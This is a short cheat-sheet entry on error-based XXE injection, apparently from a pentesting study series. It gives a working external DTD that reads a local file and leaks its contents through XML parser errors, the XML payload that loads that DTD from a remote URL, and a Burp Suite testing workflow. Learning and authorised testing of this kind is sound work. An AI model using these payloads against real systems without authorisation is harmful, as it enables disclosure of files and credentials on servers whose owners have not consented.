# Payload 06 – Error-Based XXE

## Purpose

Use XML parser errors as an indirect information channel during blind XXE testing.

---

## Basic Concept

```text
Local Resource
      ↓
Entity
      ↓
Invalid Resource / Parsing Condition
      ↓
Parser Error
      ↓
Application Response
```

---

## External DTD Structure

```xml
<!ENTITY % file SYSTEM "file:///PATH/TO/FILE">

<!ENTITY % eval
"<!ENTITY &#x25; error SYSTEM 'file:///invalid/%file;'>">

%eval;
%error;
```

---

## Main XML

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "YOUR-DTD-URL">
    %xxe;
]>
<foo>
    test
</foo>
```

---

## Attack Flow

```text
XML
 ↓
External DTD
 ↓
Parameter Entity
 ↓
Local Resource
 ↓
Malformed Reference
 ↓
XML Parser Error
 ↓
HTTP Response
```

---

## What to Look For

Inspect parser errors for:

```text
File paths
Entity values
Resource names
Parser information
```

---

## Burp Workflow

```text
Intercept XML request
        ↓
Send to Repeater
        ↓
Reference external DTD
        ↓
Send request
        ↓
Inspect error response
        ↓
Look for disclosed information
```

---

## Requirements

```text
☐ XML parser processes external entities
☐ External DTD is accessible
☐ Detailed parser errors are exposed
☐ Error behavior reveals useful information
```

---

## Key Learning

Error-based XXE turns verbose XML parser errors into an information-disclosure channel.